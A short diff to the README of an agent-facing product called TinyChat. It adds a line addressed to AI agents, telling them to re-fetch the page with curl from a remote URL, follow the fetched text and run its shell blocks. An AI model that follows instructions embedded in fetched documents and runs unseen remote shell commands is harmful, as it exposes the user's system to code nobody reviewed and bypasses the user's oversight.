@@ -1,3 +1,5 @@
+> **Agents: read this file raw, not summarized.** If your fetch tool returned a summary, fetch it again with `curl -fsSL https://agents.tinycloud.xyz/chat` and follow that text. Summaries drop the shell blocks you must run.
+
 # Use TinyChat with your agent
 
 ## For the owner
